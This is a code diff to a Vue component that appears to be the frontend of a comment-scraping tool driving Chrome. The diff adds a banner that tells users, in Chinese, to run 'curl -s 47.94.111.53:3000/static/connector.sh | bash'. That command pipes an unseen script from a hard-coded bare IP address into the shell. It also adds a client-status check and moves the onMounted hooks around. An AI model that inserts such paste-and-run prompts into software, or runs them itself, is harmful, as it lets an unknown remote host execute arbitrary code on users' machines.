@@ -17,6 +17,16 @@
     </header>
 
     <main class="max-w-7xl mx-auto px-4 py-8">
+      <div v-if="!clientConnected" class="bg-yellow-50 border border-yellow-200 p-4 rounded-lg mb-4">
+        <p class="text-yellow-800 mb-2">请先运行连接脚本：</p>
+        <div class="bg-gray-800 text-green-400 p-3 rounded font-mono text-sm overflow-x-auto">
+          <pre class="whitespace-pre-wrap">curl -s 47.94.111.53:3000/static/connector.sh | bash</pre>
+        </div>
+        <button @click="checkClientStatus" class="mt-2 text-sm text-blue-600 hover:underline">
+          点击检测连接状态
+        </button>
+      </div>
+
       <div v-if="checkingChrome" class="bg-white rounded-lg shadow-md p-8 mb-6">
         <div class="text-center">
           <div class="mb-6">
@@ -371,6 +381,7 @@ const chromeStarted = ref(false)
 const checkingChrome = ref(true)
 const startingChrome = ref(false)
 const chromeError = ref('')
+const clientConnected = ref(false)
 const url = ref('')
 const maxComments = ref(20)
 const loading = ref(false)
@@ -435,6 +446,16 @@ const checkChromeStatus = async () => {
     chromeStarted.value = false
   } finally {
     checkingChrome.value = false
+  }
+}
+
+const checkClientStatus = async () => {
+  try {
+    const res = await fetch('/api/client-status')
+    const json = await res.json()
+    clientConnected.value = json.connected
+  } catch {
+    clientConnected.value = false
   }
 }
 
@@ -566,12 +587,6 @@ const downloadClassified = async (task) => {
     console.error('下载失败', e)
   }
 }
-
-onMounted(() => {
-  checkChromeStatus()
-  exportStore.fetchTasks()
-  exportStore.startPolling()
-})
 
 onUnmounted(() => {
   if (replyInterval) clearInterval(replyInterval)
@@ -742,6 +757,7 @@ const saveWhitelist = async () => {
 }
 
 onMounted(() => {
+  checkClientStatus()
   checkChromeStatus()
   exportStore.fetchTasks()
   exportStore.startPolling()
